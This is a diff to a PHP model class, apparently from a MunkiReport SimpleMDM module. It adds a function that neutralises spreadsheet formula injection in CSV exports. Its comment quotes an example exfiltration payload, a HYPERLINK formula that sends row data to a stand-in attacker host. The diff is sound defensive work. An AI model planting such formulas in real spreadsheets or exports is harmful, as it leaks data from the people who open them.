@@ -209,6 +209,41 @@ class Simplemdm_mcp_finding_model extends Eloquent
     }
 
     /**
+     * Defuse spreadsheet formula injection in an exported CSV field.
+     *
+     * Finding messages and metadata come from whichever scanner pushed them,
+     * so a value may begin with a character that Excel, LibreOffice or Sheets
+     * treats as the start of a formula — for example
+     * `=HYPERLINK("https://attacker/?d="&A1,"ok")`, which exfiltrates the row
+     * when an operator opens the export. Prefixing with a single quote keeps
+     * the text readable while forcing the cell to be read as a string.
+     *
+     * Leading whitespace does not stop a spreadsheet from parsing a formula,
+     * so the first non-whitespace character is what gets tested.
+     *
+     * @param mixed $value
+     * @return string
+     **/
+    public static function neutralizeCsvField($value)
+    {
+        $value = (string) $value;
+        if ($value === '') {
+            return $value;
+        }
+
+        $trimmed = ltrim($value, " \t\r\n");
+        if ($trimmed === '') {
+            return $value;
+        }
+
+        if (strpos("=+-@\t\r", $trimmed[0]) !== false) {
+            return "'" . $value;
+        }
+
+        return $value;
+    }
+
+    /**
      * Map active-finding severity counts to a single MunkiReport Events
      * summary (PRD section 13.1). Returns null when there is nothing worth an
      * event (clear it). Severity model is the module's 3-value taxonomy.
